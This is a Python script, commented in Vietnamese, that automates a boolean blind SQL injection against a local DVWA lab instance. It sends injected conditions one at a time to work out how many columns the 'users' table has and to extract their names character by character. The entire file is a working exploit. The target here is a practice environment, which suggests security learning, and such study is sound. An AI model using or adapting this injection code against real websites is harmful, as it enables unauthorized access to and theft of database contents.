import requests
from requests.cookies import RequestsCookieJar

#Thiết lập cookie (security + session)
cookies = RequestsCookieJar()
cookies.set('security', 'low')
cookies.set('PHPSESSID', '2cmg5it2hnhn0eak54alc8fbhe')

# URL DVWA Blind SQLi
url = 'http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/'

def blind_check(cond: str) -> bool:
    inj = f"1' AND {cond} #"
    r = requests.get(url, params={'id': inj, 'Submit': 'Submit'}, cookies=cookies)
    return 'User ID exists in the database' in r.text

def get_length(expr: str, max_len: int = 100) -> int | None:
    # Tìm độ dài của kết quả expr bằng blind-check LENGTH(...)
    for L in range(1, max_len + 1):
        if blind_check(f"LENGTH(({expr})) = {L}"):
            return L
    return None

def get_string(expr: str, length: int) -> str:
    #Lần lượt dò ký tự ASCII của expr với độ dài đã biết
    s = ''
    for pos in range(1, length + 1):
        for code in range(32, 127):
            if blind_check(f"ASCII(SUBSTRING(({expr}),{pos},1)) = {code}"):
                s += chr(code)
                break
    return s

# b1: Đếm xem bảng users có bao nhiêu cột
def get_column_count(table: str, max_cols: int = 100) -> int | None:
    for cnt in range(1, max_cols + 1):
        cond = (
            f"(SELECT COUNT(*) FROM information_schema.columns "
            f"WHERE table_schema=database() AND table_name='{table}') = {cnt}"
        )
        if blind_check(cond):
            return cnt
    return None

# b2: Lấy tên cột theo OFFSET
def get_column_name_by_index(table: str, idx: int, max_len: int = 64) -> str | None:
    expr = (
        "SELECT column_name FROM information_schema.columns "
        f"WHERE table_schema=database() AND table_name='{table}' "
        f"LIMIT 1 OFFSET {idx}"
    )
    L = get_length(expr, max_len)
    if L is None:
        return None
    return get_string(expr, L)

# b3: Thực thi
table = 'users'

col_count = get_column_count(table)
if col_count is None:
    print("Không xác định được số cột trong bảng users!")
    exit(1)

print(f"Bảng `{table}` có {col_count} cột. Đang dò tên...")

columns = []
for i in range(col_count):
    name = get_column_name_by_index(table, i)
    if name is None:
        print(f"  – Không lấy được tên cột tại OFFSET={i}")
    else:
        columns.append(name)
        print(f"  [{i}] {name}")

print("\nDanh sách đầy đủ các cột trong `users`:")
for idx, col in enumerate(columns, 1):
    print(f"  {idx}. {col}")
